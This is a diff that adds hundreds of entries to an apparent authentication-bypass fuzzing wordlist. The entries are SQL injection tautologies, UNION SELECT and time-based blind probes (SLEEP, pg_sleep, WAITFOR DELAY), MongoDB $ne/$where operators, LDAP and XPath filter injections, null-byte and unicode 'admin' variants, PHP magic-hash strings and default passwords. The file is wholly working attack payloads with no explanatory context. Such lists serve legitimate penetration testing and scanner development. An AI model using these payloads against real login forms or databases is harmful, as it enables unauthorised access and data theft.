@@ -1,3 +1,4 @@
+
  'or 1=1--
  'OR 1=1%00
  'or''='
@@ -22,9 +23,11 @@
  or 1=1/*
  or 1=1#
  or true
+_admin
 -
 --';
 -1%cf'/**/UnIon/**/SeLect/**/1,1,1/**/as/**/password,1,1,1/**/%23"
+, $where: '1 == 1'
 !
 ¡® or 1=1 --
 ¡® or 3=3 --
@@ -34,9 +37,14 @@
 ?id=1' and sleep(2) and substring(database(),1,1)="a"--+
 ?id=1' and substring(database(),1,1)="a"--+
 ?id=1' order by 1 --+
+'
 ' --
+' –
 ' ;
 ' '
+' } ], $comment:'successful MongoDB injection'
+' && this.password.match(/.*/)//+%00
+' && this.passwordzz.match(/.*/)//+%00
 ' #
 ' and '' like '
 ' AnD '' like '
@@ -48,6 +56,7 @@
 ' and 'one'='one�?' group by password having 1=1--
 ' and 'x'='x
 ' and 1='1
+' AND 1=0 UNION ALL SELECT '', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
 ' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
 ' and 2>1--
 ' and 2>3--
@@ -77,10 +86,14 @@
 ' or 'one'='one�?' or uid like '%
 ' or 'x'='x
 ' OR 'x'='x'#;
+' or "a" or '
+' or /* or '
 ' or 0=0 --
 ' or 0=0 –
 ' or 0=0 #
 ' or 0=0 �?" or 0=0 --
+' or 1 or '
+' or 1]%00
 ' or 1=1
 ' or 1=1 --
 ' or 1=1 –
@@ -98,6 +111,7 @@
 ' or a=a–
 ' or a=a�?') or ('a'='a
 ' or true--
+' or true() or '
 ' or uid like '%
 ' or uname like '%
 ' or user like '%
@@ -105,13 +119,34 @@
 ' or username like '%
 ' UNION ALL SELECT 1, @@version;#
 ' UNION ALL SELECT system_user(),user();#
+' UniON SElecT 1,2-- 2
+' UniON SElecT 1,2,3-- 2
+' UniON SElecT 1,2,3,4-- 2
+' UniON SElecT 1,2,3,4,5-- 2
+' UniON SElecT 1,2,3,4,5#
+' UnION SELeCT 1,2,3,4,5`
+' UniON SElecT 1,2,3,4#
+' UnION SELeCT 1,2,3,4`
+' UniON SElecT 1,2,3#
+' UnION SELeCT 1,2,3`
+' UniON SElecT 1,2#
+' UnION SELeCT 1,2`
 ' UNION select table_schema,table_name FROM information_Schema.tables;#
 ' �?'--
+'--
+'-- 2
 '-'
+'-''-- 2
+'-''/*
+'-''#
+', $or: [ {}, { 'a':'a
+', $where: '1 == 1'
+';return 'a'=='a' && ''=='
 ';shutdown--
 '.).or.('.a.'='.a
 '.).or.('.a.'='.a/**/
 ''or'='or'
+')
 ') and ('x'='x
 ') or '1'='1
 ') or '1'='1--
@@ -130,10 +165,141 @@
 ') or ('x')=('x
 ') or ('x'='x
 ') or true--
+') UniON SElecT 1,2-- 2
+') UniON SElecT 1,2,3-- 2
+') UniON SElecT 1,2,3,4-- 2
+') UniON SElecT 1,2,3,4,5-- 2
+') UniON SElecT 1,2,3,4,5#
+') UniON SElecT 1,2,3,4#
+') UniON SElecT 1,2,3#
+') UniON SElecT 1,2#
+')-- 2
+')-''-- 2
+')-''/*
+')-''#
+')-('
 ')) or (('x'))=(('x
+')*''-- 2
+')*''/*
+')*''#
+')*('
+')/*
 ')/**/or/**/('a'='a
+')&''-- 2
+')&''/*
+')&''#
+')&('
+')#
+')^''-- 2
+')^''/*
+')^''#
+')^('
+')=''-- 2
+')=''/*
+')=''#
+')=('
+')||'2'='2'||('
+')||'2'=('2
+')||'2'||('
+')||'2'LiKE'2'-- 2
+')||'2'LiKE'2'/*
+')||'2'LiKE'2'#
+')||'2'LiKE'2'||('
+')||'2'LiKE('2
+')||('2
+')||(2)LiKE(2)-- 2
+')||(2)LiKE(2)/*
+')||(2)LiKE(2)#
+')||(2)LiKE(2)||('
+')||2-- 2
+')||2/*
+')||2#
+')||2=(2)LimIT(1)-- 2
+')||2=(2)LimIT(1)/*
+')||2=(2)LimIT(1)#
+')||2=2-- 2
+')||2=2/*
+')||2=2#
+')||2=2||('
+')||2||('
+')||true-- 2
+')||true/*
+')||true#
+')||true||('
+')oR 2 oR('
+')oR 2-- 2
+')oR 2/*
+')oR 2#
+')oR 2=2 oR('
+')oR 2=2-- 2
+')oR 2=2/*
+')oR 2=2#
+')oR true oR('
+')oR true-- 2
+')oR true/*
+')oR true#
+')oR'2'-- 2
+')oR'2'/*
+')oR'2'#
+')oR'2'='2' LimIT 1-- 2
+')oR'2'='2' LimIT 1/*
+')oR'2'='2' LimIT 1#
+')oR'2'='2'-- 2
+')oR'2'='2'/*
+')oR'2'='2'#
+')oR'2'='2'oR('
+')oR'2'=('2
+')oR'2'LiKE'2'-- 2
+')oR'2'LiKE'2'/*
+')oR'2'LiKE'2'#
+')oR'2'LiKE'2'oR('
+')oR'2'LiKE('2
+')oR'2'oR('
+')oR('2
 ')or('a'='a
+')oR(2)-- 2
+')oR(2)/*
+')oR(2)#
+')oR(2)=(2)LimIT(1)-- 2
+')oR(2)=(2)LimIT(1)/*
+')oR(2)=(2)LimIT(1)#
+')oR(2)=(2)oR('
+')oR(2)=2-- 2
+')oR(2)=2/*
+')oR(2)=2#
+')oR(2)LiKE(2)-- 2
+')oR(2)LiKE(2)/*
+')oR(2)LiKE(2)#
+')oR(2)LiKE(2)oR('
+')oR(2)oR('
+')oR(true)-- 2
+')oR(true)/*
+')oR(true)#
+')oR(true)oR('
+')oR/**/2-- 2
+')oR/**/2/*
+')oR/**/2/**/oR('
+')oR/**/2#
+')oR/**/2=2-- 2
+')oR/**/2=2/*
+')oR/**/2=2/**/oR('
+')oR/**/2=2#
+')oR/**/true-- 2
+')oR/**/true/*
+')oR/**/true/**/oR('
+')oR/**/true#
+')UniON(SElecT(1),2,3,4,5)-- 2
+')UniON(SElecT(1),2,3,4,5)#
+')UniON(SElecT(1),2,3,4)-- 2
+')UniON(SElecT(1),2,3,4)#
+')UniON(SElecT(1),2,3)-- 2
+')UniON(SElecT(1),2,3)#
+')UniON(SElecT(1),2)-- 2
+')UniON(SElecT(1),2)#
 '*'
+'*''-- 2
+'*''/*
+'*''#
 '/*
 '/**/or/**/''='
 '/**/or/**/'2'>'1
@@ -141,12 +307,52 @@
 '/**/or/**/2>1#
 '/**/UnIon/**/SeLect/**/1,1,1/**/from/**/admin/**/Where/**/''='
 '&'
+'&''-- 2
+'&''/*
+'&''#
 '#
+'%20%26%26%20this.password.match(/.*/)//+%00
+'%20%26%26%20this.passwordzz.match(/.*/)//+%00
 '^'
+'^''-- 2
+'^''/*
+'^''#
 '+||+1=1#
+'='
 '=' 'or' and '=' 'or'
+'=''-- 2
+'=''/*
+'=''#
 '=''or'
 '="or'
+'||'2
+'||'2'='2
+'||'2'='2'||'
+'||'2'||'
+'||'2'LiKE'2
+'||'2'LiKE'2'-- 2
+'||'2'LiKE'2'/*
+'||'2'LiKE'2'#
+'||'2'LiKE'2'||'
+'||(2)LiKE(2)-- 2
+'||(2)LiKE(2)/*
+'||(2)LiKE(2)#
+'||(2)LiKE(2)||'
+'||2-- 2
+'||2/*
+'||2#
+'||2=(2)LimIT(1)-- 2
+'||2=(2)LimIT(1)/*
+'||2=(2)LimIT(1)#
+'||2=2-- 2
+'||2=2/*
+'||2=2#
+'||2=2||'
+'||2||'
+'||true-- 2
+'||true/*
+'||true#
+'||true||'
 'or 1=1
 'OR 1=1
 'or 1=1 or ''='
@@ -154,7 +360,23 @@
 'or 1=1-- aassd s
 'or 1=1/*
 'OR 1=1%00
+'oR 2 oR'
+'oR 2-- 2
+'oR 2/*
+'oR 2#
+'oR 2=2 oR'
+'oR 2=2-- 2
+'oR 2=2/*
+'oR 2=2#
+'or contains(.,'adm') or'
+'or contains(name,'adm') or'
+'or position()=2 or'
 'or select *
+'or string-length(name(.))<10 or'
+'oR true oR'
+'oR true-- 2
+'oR true/*
+'oR true#
 'or.'a.'='a
 'or' '1'='1'
 'or''='
@@ -165,17 +387,76 @@
 'or'1=1
 'or'1=1′
 'or'1=1�?" or "1"="1
+'oR'2
+'oR'2'-- 2
+'oR'2'/*
+'oR'2'#
+'oR'2'='2
+'oR'2'='2' LimIT 1-- 2
+'oR'2'='2' LimIT 1/*
+'oR'2'='2' LimIT 1#
+'oR'2'='2'-- 2
+'oR'2'='2'/*
+'oR'2'='2'#
+'oR'2'='2'oR'
+'oR'2'LiKE'2
+'oR'2'LiKE'2'-- 2
+'oR'2'LiKE'2'/*
+'oR'2'LiKE'2'#
+'oR'2'LiKE'2'oR'
+'oR'2'oR'
 'or'a'='a
 'or"="a'='a
+'oR(2)-- 2
+'oR(2)/*
+'oR(2)#
+'oR(2)=(2)LimIT(1)-- 2
+'oR(2)=(2)LimIT(1)/*
+'oR(2)=(2)LimIT(1)#
+'oR(2)=(2)oR'
+'oR(2)=2-- 2
+'oR(2)=2/*
+'oR(2)=2#
+'oR(2)LiKE(2)-- 2
+'oR(2)LiKE(2)/*
+'oR(2)LiKE(2)#
+'oR(2)LiKE(2)oR'
+'oR(2)oR'
+'oR(true)-- 2
+'oR(true)/*
+'oR(true)#
+'oR(true)oR'
 'or/**/1=1
 'or/**/1=1--
 'or/**/1=1/*
 'OR/**/1=1%00
+'oR/**/2-- 2
+'oR/**/2/*
+'oR/**/2/**/oR'
+'oR/**/2#
+'oR/**/2=2-- 2
+'oR/**/2=2/*
+'oR/**/2=2/**/oR'
+'oR/**/2=2#
+'oR/**/true-- 2
+'oR/**/true/*
+'oR/**/true/**/oR'
+'oR/**/true#
 'or1=1--
+'UniON(SElecT(1),2,3,4,5)-- 2
+'UniON(SElecT(1),2,3,4,5)#
+'UniON(SElecT(1),2,3,4)-- 2
+'UniON(SElecT(1),2,3,4)#
+'UniON(SElecT(1),2,3)-- 2
+'UniON(SElecT(1),2,3)#
+'UniON(SElecT(1),2)-- 2
+'UniON(SElecT(1),2)#
 'xor
+"
 " --
 " "
 " #
+" AND 1=0 UNION ALL SELECT "", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
 " AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
 " or "" "
 " or ""-"
@@ -206,9 +487,28 @@
 " or 1=1#
 " or 1=1�?") or "1"="1
 " or true--
+" UniON SElecT 1,2-- 2
+" UniON SElecT 1,2,3-- 2
+" UniON SElecT 1,2,3,4-- 2
+" UniON SElecT 1,2,3,4,5-- 2
+" UniON SElecT 1,2,3,4,5#
+" UnION SELeCT 1,2,3,4,5`
+" UniON SElecT 1,2,3,4#
+" UnION SELeCT 1,2,3,4`
+" UniON SElecT 1,2,3#
+" UnION SELeCT 1,2,3`
+" UniON SElecT 1,2#
+" UnION SELeCT 1,2`
+"-- 2
 "-"
+"-""-- 2
+"-""/*
+"-""#
+";return(true);var xyz='a
 "' or 1 -- aassd'"
 "' or 1 --'"
+")
+") #
 ") or "1"="1
 ") or "1"="1"--
 ") or "1"="1"/*
@@ -220,27 +520,282 @@
 ") or ("a"="a
 ") or ("x")=("x
 ") or true--
+") UniON SElecT 1,2-- 2
+") UniON SElecT 1,2,3-- 2
+") UniON SElecT 1,2,3,4-- 2
+") UniON SElecT 1,2,3,4,5-- 2
+") UniON SElecT 1,2,3,4,5#
+") UniON SElecT 1,2,3,4#
+") UniON SElecT 1,2,3#
+") UniON SElecT 1,2#
+")-- 2
+")-""-- 2
+")-""/*
+")-""#
+")-("
 ")) or (("x"))=(("x
+")*""-- 2
+")*""/*
+")*""#
+")*("
+")/*
+")&""-- 2
+")&""/*
+")&""#
+")&("
+")^""-- 2
+")^""/*
+")^""#
+")^("
+")=""-- 2
+")=""/*
+")=""#
+")=("
+")||"2"="2"||("
+")||"2"=("2
+")||"2"||("
+")||"2"LiKE"2"-- 2
+")||"2"LiKE"2"/*
+")||"2"LiKE"2"#
+")||"2"LiKE"2"||("
+")||"2"LiKE("2
+")||("2
+")||(2)LiKE(2)-- 2
+")||(2)LiKE(2)/*
+")||(2)LiKE(2)#
+")||(2)LiKE(2)||("
+")||2-- 2
+")||2/*
+")||2#
+")||2=(2)LimIT(1)-- 2
+")||2=(2)LimIT(1)/*
+")||2=(2)LimIT(1)#
+")||2=2-- 2
+")||2=2/*
+")||2=2#
+")||2=2||("
+")||2||("
+")||true-- 2
+")||true/*
+")||true#
+")||true||("
+")oR 2 oR("
+")oR 2-- 2
+")oR 2/*
+")oR 2#
+")oR 2=2 oR("
+")oR 2=2-- 2
+")oR 2=2/*
+")oR 2=2#
+")oR true oR("
+")oR true-- 2
+")oR true/*
+")oR true#
+")oR"2"-- 2
+")oR"2"/*
+")oR"2"#
+")oR"2"="2" LimIT 1-- 2
+")oR"2"="2" LimIT 1/*
+")oR"2"="2" LimIT 1#
+")oR"2"="2"-- 2
+")oR"2"="2"/*
+")oR"2"="2"#
+")oR"2"="2"oR("
+")oR"2"=("2
+")oR"2"LiKE"2"-- 2
+")oR"2"LiKE"2"/*
+")oR"2"LiKE"2"#
+")oR"2"LiKE"2"oR("
+")oR"2"LiKE("2
+")oR"2"oR("
+")oR("2
+")oR(2)-- 2
+")oR(2)/*
+")oR(2)#
+")oR(2)=(2)LimIT(1)-- 2
+")oR(2)=(2)LimIT(1)/*
+")oR(2)=(2)LimIT(1)#
+")oR(2)=(2)oR("
+")oR(2)=2-- 2
+")oR(2)=2/*
+")oR(2)=2#
+")oR(2)LiKE(2)-- 2
+")oR(2)LiKE(2)/*
+")oR(2)LiKE(2)#
+")oR(2)LiKE(2)oR("
+")oR(2)oR("
+")oR(true)-- 2
+")oR(true)/*
+")oR(true)#
+")oR(true)oR("
+")oR/**/2-- 2
+")oR/**/2/*
+")oR/**/2/**/oR("
+")oR/**/2#
+")oR/**/2=2-- 2
+")oR/**/2=2/*
+")oR/**/2=2/**/oR("
+")oR/**/2=2#
+")oR/**/true-- 2
+")oR/**/true/*
+")oR/**/true/**/oR("
+")oR/**/true#
+")UniON(SElecT(1),2,3,4,5)-- 2
+")UniON(SElecT(1),2,3,4,5)#
+")UniON(SElecT(1),2,3,4)-- 2
+")UniON(SElecT(1),2,3,4)#
+")UniON(SElecT(1),2,3)-- 2
+")UniON(SElecT(1),2,3)#
+")UniON(SElecT(1),2)-- 2
+")UniON(SElecT(1),2)#
 "*"
+"*""-- 2
+"*""/*
+"*""#
 "/*
 "&"
+"&""-- 2
+"&""/*
+"&""#
 "^"
+"^""-- 2
+"^""/*
+"^""#
+"="
+"=""-- 2
+"=""/*
+"=""#
+"||"2
+"||"2"="2
+"||"2"="2"||"
+"||"2"||"
+"||"2"LiKE"2
+"||"2"LiKE"2"-- 2
+"||"2"LiKE"2"/*
+"||"2"LiKE"2"#
+"||"2"LiKE"2"||"
+"||(2)LiKE(2)-- 2
+"||(2)LiKE(2)/*
+"||(2)LiKE(2)#
+"||(2)LiKE(2)||"
+"||2-- 2
+"||2/*
+"||2#
+"||2=(2)LimIT(1)-- 2
+"||2=(2)LimIT(1)/*
+"||2=(2)LimIT(1)#
+"||2=2-- 2
+"||2=2/*
+"||2=2#
+"||2=2||"
+"||2||"
+"||true-- 2
+"||true/*
+"||true#
+"||true||"
 "or "a"="a
 "or 1=1
 "or 1=1 or ""="
 "or 1=1--
 "or 1=1-- aassd
 "or 1=1%00
+"oR 2 oR"
+"oR 2-- 2
+"oR 2/*
+"oR 2#
+"oR 2=2 oR"
+"oR 2=2-- 2
+"oR 2=2/*
+"oR 2=2#
+"oR true oR"
+"oR true-- 2
+"oR true/*
+"oR true#
 "or"="
 "or"="a'='a
+"oR"2
+"oR"2"-- 2
+"oR"2"/*
+"oR"2"#
+"oR"2"="2
+"oR"2"="2" LimIT 1-- 2
+"oR"2"="2" LimIT 1/*
+"oR"2"="2" LimIT 1#
+"oR"2"="2"-- 2
+"oR"2"="2"/*
+"oR"2"="2"#
+"oR"2"="2"oR"
+"oR"2"LiKE"2
+"oR"2"LiKE"2"-- 2
+"oR"2"LiKE"2"/*
+"oR"2"LiKE"2"#
+"oR"2"LiKE"2"oR"
+"oR"2"oR"
+"oR(2)-- 2
+"oR(2)/*
+"oR(2)#
+"oR(2)=(2)LimIT(1)-- 2
+"oR(2)=(2)LimIT(1)/*
+"oR(2)=(2)LimIT(1)#
+"oR(2)=(2)oR"
+"oR(2)=2-- 2
+"oR(2)=2/*
+"oR(2)=2#
+"oR(2)LiKE(2)-- 2
+"oR(2)LiKE(2)/*
+"oR(2)LiKE(2)#
+"oR(2)LiKE(2)oR"
+"oR(2)oR"
+"oR(true)-- 2
+"oR(true)/*
+"oR(true)#
+"oR(true)oR"
 "or/**/1=1--
 "or/**/1=1%00
+"oR/**/2-- 2
+"oR/**/2/*
+"oR/**/2/**/oR"
+"oR/**/2#
+"oR/**/2=2-- 2
+"oR/**/2=2/*
+"oR/**/2=2/**/oR"
+"oR/**/2=2#
+"oR/**/true-- 2
+"oR/**/true/*
+"oR/**/true/**/oR"
+"oR/**/true#
 "or=or"
 "or1=1--
+"UniON(SElecT(1),2,3,4,5)-- 2
+"UniON(SElecT(1),2,3,4,5)#
+"UniON(SElecT(1),2,3,4)-- 2
+"UniON(SElecT(1),2,3,4)#
+"UniON(SElecT(1),2,3)-- 2
+"UniON(SElecT(1),2,3)#
+"UniON(SElecT(1),2)-- 2
+"UniON(SElecT(1),2)#
 ) and (1=1
 ) or '1′='1–
 ) or '1�?'1�?) or ('1�?'1�?' or 1=1 LIMIT 1;#
 ) or ('1′='1–
+[$ne]=1
+[$ne]=toto
+[$regex]=a.*
+{ $ne: 1 }
+{"$gt": undefined}
+{"$ne": "bar"}
+{"$ne": null}
+{$gt: ''}
+*
+*)(&
+*)(|(*
+*)(|(&
+*))%00
+\u0041dmin
+\u0061\u0064\u006d\u0069\u006e
+\u0061dmin
+\u0070assword
+\uFF41dmin
 \x23
 \x27
 \x27\x4F\x52 SELECT *
@@ -251,30 +806,110 @@
 #
 # from wapiti
 %' or '0'='0
+%09admin%20
+%20admin
+%8C%A8%27 Or 1-- 2
+%8C%A8%27 Or 1=1-- 2
+%8C%A8%27) Or 1-- 2
+%8C%A8%27) Or 1=1-- 2
+%8C%A8%27)||1-- 2
+%8C%A8%27)Or(1)-- 2
+%8C%A8%27||1-- 2
+%8C%A8%27Or(1)-- 2
+%A8%27 Or 1-- 2
+%A8%27 Or 1=1-- 2
+%A8%27) Or 1-- 2
+%A8%27) Or 1=1-- 2
+%A8%27)||1-- 2
+%A8%27)Or(1)-- 2
+%A8%27||1-- 2
+%A8%27Or(1)-- 2
+%admin
+%admin%
+%bf' Or 1-- 2
+%bf' Or 1=1 -- 2
+%bf') Or 1-- 2
+%bf') Or 1=1 -- 2
+%bf')||1-- 2
+%bf')Or(1)-- 2
+%bf'||1-- 2
+%bf'Or(1)-- 2
+%c0%61dmin
+%e0%80%61dmin
+=
 = --
 = ;
 = '
+==
+|| 1==1
+$where: '1 == 1'
+0;return true
 0' or '0' = '0
+0')&lt;'2'-- 2
+0')&lt;'2'/*
+0')&lt;'2'#
+0')&lt;('2
+0'&lt;'2
+0'&lt;'2'-- 2
+0'&lt;'2'/*
+0'&lt;'2'#
+0")&lt;"2-- 2
+0")&lt;"2/*
+0")&lt;"2#
+0")&lt;("2
+0"&lt;"2
+0"&lt;"2"-- 2
+0"&lt;"2"/*
+0"&lt;"2"#
 1
 1 or '1'='1' or 1=1
 1 or '1'='1'=1
+1, $where: '1 == 1'
 1' or '1' = '1
 1' or substring(password,1,1)='a' or '1'='1
 1'or'1'='1
 1′) and '1′='1–
+1234
+1234 ' AND 1=0 UNION ALL SELECT 'admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
+1234 " AND 1=0 UNION ALL SELECT "admin", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
+123456
 1�? and '1�?'1�?' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
+240610708
+a_min
 a'or' 1=1--
 a'or' 1=1-- aassd 
 a'or'/**/1=1--
 a'or'1=1--
+a%min
+aaaaaaaaaaaaaaaa
+aabg7XSs
+ad\u006din
+admin
+aDmIn
+AdMiN
+ADMIN
+admin_
 admin' --
 admin' -- aassd
 admin’ —
 admin' #
 admin’ #
+admin' AND 'x'<>'y
+admin' AND 1<2--
+admin' AND 2>1--
+admin' AND 3<>4#
+admin' AND ASCII('a')=97--
+admin' AND BENCHMARK(1000000,MD5('test'))--
+admin' AND EXISTS(SELECT * FROM users)--
+admin' AND LENGTH('a')=1--
+admin' AND NOT EXISTS(SELECT * FROM fake_table)--
+admin' AND pg_sleep(5)--
+admin' AND SLEEP(10)#
+admin' AND SLEEP(5)--
 admin' and substring(password/text(),1,1)='7
+admin' or '
 admin' Or '1'!='1
 admin' or '1'='1
 admin’ or ‘1’=’1
@@ -285,6 +920,7 @@ admin’ or ‘1’=’1’/*
 admin' or '1'='1'#
 admin’ or ‘1’=’1’#
 admin’ or ‘1’=’1′–
+admin' or '1'='2
 admin' or 1=1
 admin’ or 1=1
 admin' or 1=1--
@@ -295,8 +931,17 @@ admin' or 1=1/*
 admin’ or 1=1/*
 admin' or 1=1#
 admin’ or 1=1#
+admin' UNION SELECT IF(1=1,SLEEP(5),0)--
+admin' WAITFOR DELAY '0:0:10'#
+admin' WAITFOR DELAY '0:0:5'--
 admin'--
+AdMiN'--
+ADMIN'--
+admin'-- 2
 admin'--/**/
+admin'; SELECT pg_sleep(10)--
+admin') AND 'x'='x
+admin') AND SLEEP(5)--
 admin') or '1'='1
 admin’) or ‘1’=’1
 admin') or '1'='1'--
@@ -315,6 +960,9 @@ admin') or ('1'='1'/*
 admin’) or (‘1’=’1’/*
 admin') or ('1'='1'#
 admin’) or (‘1’=’1’#
+admin')-- 2
+admin')/*
+admin')#
 admin'/*
 admin’/*
 admin'/**/and/**/2/**/BeTween/**/1/**/and/**/3--/**/
@@ -323,8 +971,11 @@ admin'/**/or/**/'1'='1
 admin'/**/or/**/1=1--/**/
 admin'/**/or/**/1=1#
 admin'#
+aDmIn'#
 admin'or 1=1 or ''='
 admin’or 1=1 or ”=’
+AdMiN'oR'1'='1
+ADMIN'oR'1'='1
 admin" --
 admin" -- aassd
 admin" #
@@ -346,6 +997,11 @@ admin" or 1=1/*
 admin” or 1=1/*
 admin" or 1=1#
 admin” or 1=1#
+AdMiN"--
+ADMIN"--
+admin"-- 2
+admin") AND "x"="x
+admin") AND SLEEP(5)--
 admin") or "1"="1
 admin”) or “1”=”1
 admin") or "1"="1"--
@@ -364,12 +1020,42 @@ admin”) or (“1″=”1
 admin”) or (“1″=”1”–
 admin”) or (“1″=”1″/*
 admin”) or (“1″=”1″#
+admin")-- 2
+admin")#
 admin"/*
+admin"#
+aDmIn"#
 admin"or 1=1 or ""="
 admin”or 1=1 or “”=”
+admin)(!(&(|
+admin)(&)
+admin))(|(|
+admin\0
+admin\0' OR '1'='1
+admin\x00
+admin\x00'--
+admin\x00\x00\x00\x00
+admin%
+admin%00
+admin%00' OR '1'='1
+admin%00'--
+admin%00"--
+admin%09
+admin%0a
+admin%0d
+admin%20
+admin%2b
+admin+
+admin00000000000
+adminxxxxxxxxxxx
 and 1=1
+and 1=1–
 and 1=1�?' and 'one'='one
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
 declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) 
+ffifdyop
+guest
 hi" or "a"="a
 hi" or 1=1 --
 hi") or ("a"="a
@@ -388,6 +1074,7 @@ or 'whatever' in ('whatever')
 or ""a""=""a"
 or (EXISTS)
 or 0=0 --
+or 0=0 –
 or 0=0 #
 or 0=0 #"
 or 0=0 �?' or         0=0 #
@@ -422,5 +1109,33 @@ or/**/a"="a
 or="a'='a
 or=or"""
 or1=1--
+Pass1234.
+Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.
+Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.')#
+Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61
+Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61'#
+Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658
+Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658'#
+Pass1234.' and 1=0 union select 'admin',sha('Pass1234.
+Pass1234.' and 1=0 union select 'admin',sha('Pass1234.')#
+Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.
+Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.")#
+Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61
+Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61"#
+Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658
+Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658"#
+Pass1234." and 1=0 union select "admin",sha("Pass1234.
+Pass1234." and 1=0 union select "admin",sha("Pass1234.")#
+password
+password\x00
+password%00
+pwd
+pwd)
+pwd))
+QNKCDZO
+root
+test
+toor
+true, $where: '1 == 1'
 ý or 1=1 --
 ý or 3=3 --
